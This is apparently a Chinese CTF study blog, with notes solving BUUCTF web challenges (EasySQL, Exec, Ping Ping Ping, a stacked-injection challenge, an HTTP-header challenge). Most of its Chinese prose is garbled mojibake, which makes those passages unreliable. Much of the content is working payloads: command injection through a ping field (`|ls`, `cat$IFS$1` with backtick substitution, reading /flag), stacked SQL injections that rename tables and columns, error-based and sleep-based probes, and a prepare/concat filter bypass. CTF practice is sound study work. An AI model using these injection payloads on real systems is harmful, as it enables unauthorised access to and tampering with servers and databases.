class="hljs-string">&quot;font-family:verdana;color:red;text-align:center;&quot;</span>&gt;</span>å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;</span>&gt;</span><br>            <span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">                echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;;</span><br><span class="hljs-meta">                $flag = &#x27;flag&#123;b7f18145-c01d-49fb-bd88-e30b9be76423&#125;&#x27;;</span><br><span class="hljs-meta">                $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27;</span><br><span class="hljs-meta">            ?&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-25date-2025-04-15-13-11-04tags-note"><a href="#title-note-25date-2025-04-15-13-11-04tags-note" class="headerlink" title="title: note-25date: 2025-04-15 13:11:04tags: note"></a>title: note-25<br>date: 2025-04-15 13:11:04<br>tags: note</h2><h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>è€æ—©å°±åšè¿‡è¿™é¢˜äº†ï¼Œå½“åˆwpçœ‹çš„åŠçŸ¥åŠè§£ï¼Œç°åœ¨æ˜¯æˆ‘æƒ³èƒ½ç®—ä¸Šæ˜¯å¤§å½»å¤§æ‚Ÿäº†å§  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> $_GET[<span class="hljs-string">&#x27;query&#x27;</span>] <span class="hljs-operator">||</span> flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>|| ç¬¦æ˜¯æˆ–çš„æ„æ€ï¼Œåº”è¯¥å°±å’Œæ³¨å…¥ä¸­çš„ || , or æ˜¯ä¸€ä¸ªç”¨æ³•  </p>
<blockquote>
<p>è¿™é‡Œçš„||åœ¨mysqlä¸­è¡¨ç¤ºæˆ–ï¼Œå¦‚æœå‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºçœŸï¼Œåˆ™ä¸çœ‹åé¢çš„è¯­å¥</p>
</blockquote>
<p>ç½‘ä¸Šæœ€å¤šçš„payloadéƒ½æ˜¯</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*,1</span><br></code></pre></td></tr></table></figure>
<p>é‚£æ‹¼æ¥è¿›sqlè¯­å¥å°±æ˜¯</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>,<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>æŸ¥è¯¢å…¨éƒ¨ï¼Œå¤–åŠ ä¸€ä¸ª select 1çš„æ•ˆæœ<br>è¿™æ ·å°±çœ‹å¾—å‡ºæ¥äº†ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-operator">*</span>),(<span class="hljs-number">1</span><span class="hljs-operator">||</span>flag) <span class="hljs-keyword">from</span> flag<br></code></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥æŸ¥è¯¢ * å‘¢ï¼Ÿ  </p>
<p>deepseekï¼š</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">åœ¨åç«¯çš„SQLè¯­å¥SELECT $_GET[&#x27;query&#x27;] |<span class="hljs-type">| flag</span> FROM flagä¸­ï¼Œ|<span class="hljs-type">|æ“ä½œç¬¦çš„ä½œç”¨å–å†³äºæ•°æ®åº“ç±»å‹ã€‚åœ¨SQLite</span>æˆ–PostgreSQLä¸­ï¼Œ|<span class="hljs-type">|è¡¨ç¤ºå­—ç¬¦ä¸²è¿æ¥ï¼Œè€Œåœ¨MySQL</span>ä¸­ï¼ˆé™¤éå¯ç”¨ç‰¹å®šæ¨¡å¼ï¼‰åˆ™ä»£è¡¨é€»è¾‘æˆ–ã€‚ä»¥ä¸‹æ˜¯éœ€è¦ä¼ *,<span class="hljs-number">1</span>è€Œé*çš„å…³é”®åŸå› ï¼š<br><br>è¯­æ³•é—®é¢˜ï¼š<br><br>è‹¥ç›´æ¥ä¼ å…¥*ï¼ŒæŸ¥è¯¢ä¼šå˜ä¸ºSELECT * |<span class="hljs-type">| flag</span> FROM flagã€‚æ­¤æ—¶*ï¼ˆé€šé…ç¬¦ï¼‰æ— æ³•ç›´æ¥ä¸å…¶ä»–å­—æ®µï¼ˆflagï¼‰è¿›è¡Œå­—ç¬¦ä¸²è¿æ¥æˆ–é€»è¾‘è¿ç®—ï¼Œå¯¼è‡´è¯­æ³•é”™è¯¯ï¼ŒæŸ¥è¯¢æ— æ³•æ‰§è¡Œã€‚<br><br>ä¼ å…¥*,<span class="hljs-number">1</span>æ—¶ï¼ŒæŸ¥è¯¢å˜ä¸ºSELECT *,<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span> FROM flagã€‚è¿™é‡Œ,å°†*å’Œ<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>åˆ†ä¸ºä¸¤ä¸ªç‹¬ç«‹åˆ—ï¼Œ*å•ç‹¬é€‰æ‹©æ‰€æœ‰å­—æ®µï¼Œ<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>åˆ™ä½œä¸ºæ–°åˆ—ï¼ˆå¦‚SQLiteä¸­ä¼šæ‹¼æ¥<span class="hljs-number">1</span>å’Œflagçš„å€¼ï¼‰ã€‚è¯­æ³•æ­£ç¡®ï¼ŒæŸ¥è¯¢æ­£å¸¸æ‰§è¡Œã€‚<br><br>ç»•è¿‡å­—æ®µé™åˆ¶ï¼š<br><br>è‹¥åç«¯ä»£ç ä»…è¿”å›ç¬¬ä¸€ä¸ªå­—æ®µçš„å€¼ï¼Œç›´æ¥ä¼ *ä¼šå› è¯­æ³•é”™è¯¯æ— ç»“æœã€‚ä¼ *,<span class="hljs-number">1</span>åï¼ŒæŸ¥è¯¢ç»“æœåŒ…å«æ‰€æœ‰åŸå§‹å­—æ®µï¼ˆé€šè¿‡*ï¼‰ï¼Œå¯èƒ½ä½¿åº”ç”¨ç¨‹åºå®Œæ•´å±•ç¤ºæ•°æ®ï¼ˆå¦‚flagå­—æ®µï¼‰ã€‚<br><br>æ•°æ®åº“ç‰¹æ€§å·®å¼‚ï¼š<br><br>åœ¨SQLiteä¸­ï¼Œ<span class="hljs-number">1</span> |<span class="hljs-type">| flag</span>ä¼šç”Ÿæˆæ–°åˆ—ï¼ˆå¦‚<span class="hljs-number">1</span>abcï¼Œå‡è®¾flagå€¼ä¸ºabcï¼‰ã€‚å³ä½¿åº”ç”¨ç¨‹åºä»…æ˜¾ç¤ºéƒ¨åˆ†ç»“æœï¼Œæ”»å‡»è€…ä¹Ÿå¯èƒ½é€šè¿‡æ–°åˆ—é—´æ¥è·å–flagå€¼ã€‚<br><br>æ€»ç»“ï¼š*,<span class="hljs-number">1</span>é€šè¿‡åˆæ³•è¯­æ³•å…è®¸*å•ç‹¬ç”Ÿæ•ˆï¼Œç»•è¿‡å› |<span class="hljs-type">|å¯¼è‡´çš„é”™è¯¯ï¼Œæœ€ç»ˆæ³„éœ²flag</span>å­—æ®µæ•°æ®ã€‚ç›´æ¥ä¼ *åˆ™å› è¯­æ³•é—®é¢˜å¤±è´¥ã€‚<br></code></pre></td></tr></table></figure>
<p>åº”è¯¥å°±æ˜¯è¯­æ³•é—®é¢˜ï¼Œå­—æ®µé™åˆ¶çš„è¯åº”è¯¥ä¸æ˜¯  </p>
<p>çœ‹çš„wpï¼š<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/StevenOnesir/article/details/110203051">https://blog.csdn.net/StevenOnesir/article/details/110203051</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xhy18634297976/article/details/122515412">https://blog.csdn.net/xhy18634297976/article/details/122515412</a></p>
<p>ä»¥å‰çœ‹ä¸æ˜ç™½ç°åœ¨çœ‹æ˜ç™½äº†ï¼Œä½†ä»¥ç°åœ¨æ°´å¹³æ‰“æ¯”èµ›æ—¶é‡åˆ°ç±»ä¼¼é¢˜ç›®åº”è¯¥çŒœä¸å‡ºæ¥åç«¯è¯­å¥</p>
<p>é‚£æ˜¯æ€æ ·çŒœå‡ºåç«¯è¯­å¥çš„å‘¢ï¼š</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">select <span class="hljs-keyword">command</span>1 || <span class="hljs-keyword">command</span>2 <br><br>æƒ…å†µä¸€ï¼šè‹¥<span class="hljs-keyword">command</span>1ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚<br><br>æƒ…å†µäºŒï¼šè‹¥<span class="hljs-keyword">command</span>1ä¸º0æˆ–å­—æ¯ï¼Œ<span class="hljs-keyword">command</span>2ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º1ã€‚<br><br>æƒ…å†µä¸‰ï¼š<span class="hljs-keyword">command</span>1å’Œ<span class="hljs-keyword">command</span>2éƒ½ä¸ä¸ºé0æ•°å­—ï¼Œåˆ™ç»“æœä¸º0ã€‚<br></code></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2302_79800344/article/details/136268777">https://blog.csdn.net/2302_79800344/article/details/136268777</a></p>
<h1 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1><p>æ ¹æ®é¢˜ç›®çŒœæµ‹æ˜¯å‘½ä»¤æ‰§è¡Œç±»å‹ï¼Œçœ‹åˆ°é¡µé¢æ˜¯ä¸€ä¸ªpingçš„åŠŸèƒ½ï¼Œå°è¯•pingäº†ä¸€ä¸‹æˆ‘çš„ç½‘ç«™ï¼š<br><a target="_blank" rel="noopener" href="http://www.gwwafz.online/">www.gwwafz.online</a><br>å›æ˜¾ï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html">PING www.gwwafz.online (39.105.15.250): 56 data bytes<br><br>--- www.gwwafz.online ping statistics ---<br>3 packets transmitted, 0 packets received, 100% packet loss<br></code></pre></td></tr></table></figure>
<p>æ•…æƒ³èµ·ä½¿ç”¨ç®¡é“ç¬¦æ¥è¿æ¥å‘½ä»¤:<br>39.105.15.250|ls &#x2F;  </p>
<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tcl">bin<br>dev<br>etc<br>flag<br>home<br>lib<br>media<br>mnt<br>opt<br><span class="hljs-keyword">proc</span><span class="hljs-title"></span><br><span class="hljs-title">root</span><br>run<span class="hljs-title"></span><br><span class="hljs-title">sbin</span><br>srv<span class="hljs-title"></span><br><span class="hljs-title">sys</span><br>tmp<span class="hljs-title"></span><br><span class="hljs-title">usr</span><br>var<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥å›æ˜¾äº†ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯cat &#x2F;flag å°±okäº†ï¼š</p>
<p>flag{eba95874-05c1-46a8-8a2f-28eff48a72be}</p>
<hr>
<h2 id="title-note-26date-2025-04-15-22-42-32tags"><a href="#title-note-26date-2025-04-15-22-42-32tags" class="headerlink" title="title: note-26date: 2025-04-15 22:42:32tags:"></a>title: note-26<br>date: 2025-04-15 22:42:32<br>tags:</h2><h1 id="GXYCTF2019-Ping-Ping-Ping-1"><a href="#GXYCTF2019-Ping-Ping-Ping-1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping 1"></a>[GXYCTF2019]Ping Ping Ping 1</h1><p>æ ¹æ®æç¤º</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1<br></code></pre></td></tr></table></figure>
<p>æ ¹æ®å›å¤ï¼Œé‚£å°±æ˜¯pingåŠŸèƒ½äº†ï¼Œ<br>å°è¯•ç”¨ç®¡é“ç¬¦è¿æ¥å‘½ä»¤ï¼š</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">ip</span>=1|ls<br><br>flag.php<br>index.php<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥å°±æœ‰flagï¼Œç„¶åå‘ç°è¿‡æ»¤äº†ç©ºæ ¼å’Œflag,<br>ä¸Šç½‘æŸ¥å¦‚ä½•ç»•è¿‡ç©ºæ ¼è¿‡æ»¤<br>æœ€åä½¿ç”¨$IFS$1</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><span class="hljs-number">1</span>|cat$IFS$<span class="hljs-number">1</span>index.php<br><br><span class="hljs-operator">/</span><span class="hljs-operator">?</span>ip<span class="hljs-operator">=</span><br>|\&#x27;|\<span class="hljs-string">&quot;|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match))&#123;<br>    echo preg_match(<span class="hljs-string">&quot;/<span class="hljs-char escape_">\&amp;</span>|<span class="hljs-char escape_">\/</span>|<span class="hljs-char escape_">\?</span>|<span class="hljs-char escape_">\*</span>|<span class="hljs-char escape_">\&lt;</span>|[<span class="hljs-char escape_">\x</span>&#123;00&#125;-<span class="hljs-char escape_">\x</span>&#123;20&#125;]|<span class="hljs-char escape_">\&gt;</span>|<span class="hljs-char escape_">\&#x27;</span>|<span class="hljs-char escape_">\&quot;</span>|<span class="hljs-char escape_">\\</span>|<span class="hljs-char escape_">\(</span>|<span class="hljs-char escape_">\)</span>|<span class="hljs-char escape_">\[</span>|<span class="hljs-char escape_">\]</span>|<span class="hljs-char escape_">\&#123;</span>|<span class="hljs-char escape_">\&#125;</span>/&quot;</span>, $ip, $match);<br>    die(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/ /&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/bash/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;<br>    die(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  $a <span class="hljs-operator">=</span> shell_exec(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.$ip);<br>  echo <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>  print_r($a);<br>&#125;<br><br><span class="hljs-operator">?</span><span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
<p>æ²¡åšæŒä¸‹å»ï¼Œå»æ‰¾wpäº†<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51439282/article/details/113378868">https://blog.csdn.net/qq_51439282/article/details/113378868</a><br>æœ€åé€‰äº†å†…è”æ³•:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=1|<span class="hljs-built_in">cat</span>$IFS<span class="hljs-variable">$1</span>`<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure>
<p>è®°ä¸€ä¸‹<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/angaoux03775/article/details/101710776">https://blog.csdn.net/angaoux03775/article/details/101710776</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_52425873/article/details/124899793">https://blog.csdn.net/m0_52425873/article/details/124899793</a></p>
<hr>
<h2 id="title-note-27date-2025-04-17-11-01-54tags-note"><a href="#title-note-27date-2025-04-17-11-01-54tags-note" class="headerlink" title="title: note-27date: 2025-04-17 11:01:54tags: note"></a>title: note-27<br>date: 2025-04-17 11:01:54<br>tags: note</h2><h1 id="2019-review-å¼ºç½‘æ¯-éšä¾¿æ³¨"><a href="#2019-review-å¼ºç½‘æ¯-éšä¾¿æ³¨" class="headerlink" title="2019 review-å¼ºç½‘æ¯-éšä¾¿æ³¨"></a>2019 review-å¼ºç½‘æ¯-éšä¾¿æ³¨</h1><p>å†åšä¸€é</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;show tables#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;select group_concat(culumn_name);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="hljs-string"></span><br><span class="hljs-string">0&#x27;</span>;extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-keyword">database</span>()));#<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;if(1=1,sleep(5),0);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;!&#x27;</span>,version()))  # <br>!<span class="hljs-number">10.3</span><span class="hljs-number">.18</span>-MariaDB<br><span class="hljs-number">1</span><span class="hljs-string">&#x27;or extractvalue(1,concat(&#x27;</span>!<span class="hljs-string">&#x27;,version()))  # </span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words <span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">COLUMN</span> flag <span class="hljs-keyword">TO</span> id;#<br>//æ²¡æ”¹æˆåŠŸï¼Œçœ‹è¿”å›å¤§æ¦‚æ˜¯è¯´æ‰¾ä¸åˆ°åä¸º<span class="hljs-string">&#x27;id&#x27;</span>çš„<span class="hljs-keyword">column</span>,<span class="hljs-keyword">column</span>æ˜¯è¡Œè¿˜æ˜¯åˆ—æ¥ç€ï¼Ÿæ˜¯åˆ—æˆ‘æœ<br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename table words to words1;ALTER TABLE employees CHANGE flag id VARCHAR(50);#</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> words1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> `<span class="hljs-number">1919810931114514</span>` <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> words CHANGE flag id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>);#<br>//æˆåŠŸ<br></code></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs applescript">è¯­å¥èƒŒæ™¯åˆ†æï¼š<br>è¿™æ®µ SQL åŒ…å«å¤šä¸ªæ“ä½œï¼Œæ ¸å¿ƒç›®çš„æ˜¯ï¼š<br><br>å°†è¡¨ <span class="hljs-built_in">words</span> é‡å‘½åä¸º words1ã€‚<br><br>å°†è¡¨ <span class="hljs-number">1919810931114514</span> é‡å‘½åä¸º <span class="hljs-built_in">words</span>ã€‚<br><br>ä¿®æ”¹æ–°è¡¨ <span class="hljs-built_in">words</span> çš„å­—æ®µ flagï¼Œå°†å…¶é‡å‘½åä¸º <span class="hljs-built_in">id</span>ï¼Œå¹¶æ›´æ”¹å…¶æ•°æ®ç±»å‹ä¸º varchar(<span class="hljs-number">50</span>)ã€‚<br></code></pre></td></tr></table></figure>
<p>æƒ³ä¸èµ·å½“åˆçš„åšé¢˜ç¬”è®°äº†ï¼Œåªæ˜¯çœ‹åˆ°æ­£åˆ™çš„æƒ…å†µæƒ³åˆ°äº†æ”¹è¡¨æ˜å’Œåˆ—æ˜ï¼Œåº”è¯¥åªæ˜¯å•çº¯çš„æƒ³èµ·ï¼Œå› ä¸ºè¿åˆ—åéƒ½å¿˜äº†æŸ¥</p>
<p>å½“æ—¶è¿˜è®°äº†å…¶å®ƒç»•è¿‡æ–¹æ³•ï¼Œ<br>è¯•ä¸€ä¸‹é¢„ç¼–è¯‘ç»•è¿‡</p>
<figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show tables name;</span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span>;show columns from `<span class="hljs-number">1919810931114514</span>`;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">2</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;1&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">7</span>) <span class="hljs-string">&quot;hahahah&quot;</span><br>&#125;<br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">6</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;flag&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;varchar(100)&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;NO&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>  [<span class="hljs-number">4</span>]=&gt;<br>  NULL<br>  [<span class="hljs-number">5</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">0</span>) <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>1â€™;prepare hack from concat(â€˜seleâ€™,â€™ctâ€™,â€™* from <code>1919810931114514</code>â€˜);exectue hack;@<br>&#x2F;&#x2F;ä¸æ˜¯ï¼Œæ˜æ˜ä¸€æ¨¡ä¸€æ ·ï¼Œä¸ºå•¥æˆ‘æ‰‹æ•²çš„æ‰§è¡Œä¸äº†<br>&#x2F;&#x2F;1â€™;prepare hack from concat(â€˜seleâ€™,â€™ctâ€™,â€™* from  <code>1919810931114514</code>â€˜);execute hack;#<br>&#x2F;&#x2F;wocï¼ŒåŸæ¥æ˜¯excute</p>
<p>1â€™;prepare hack from concat(â€˜seleâ€™,â€™ctâ€™,â€™* from <code>1919810931114514</code>â€˜);execute hack;@</p>
<h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h1><p>æ ¹æ®æç¤º<br>f12 æœç´¢secretï¼Œæ‰¾åˆ°ï¼š<br><a target="_blank" rel="noopener" href="http://node5.buuoj.cn:27381/Secret.php">http://node5.buuoj.cn:27381/Secret.php</a><br>ç„¶åå°±æ˜¯æ ¹æ®æç¤ºæ”¹è¯·æ±‚å¤´ï¼Œ  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Access-Control-Allow-Origin:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">From:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer:</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><br><span class="hljs-params">Referer :</span> https:<span class="hljs-symbol">//Sycsecret.buuoj.cn</span><br><span class="hljs-symbol">//Please</span> use <span class="hljs-string">&quot;Syclover&quot;</span> browser<br><br><br><span class="hljs-params">Referer :</span> https:<span 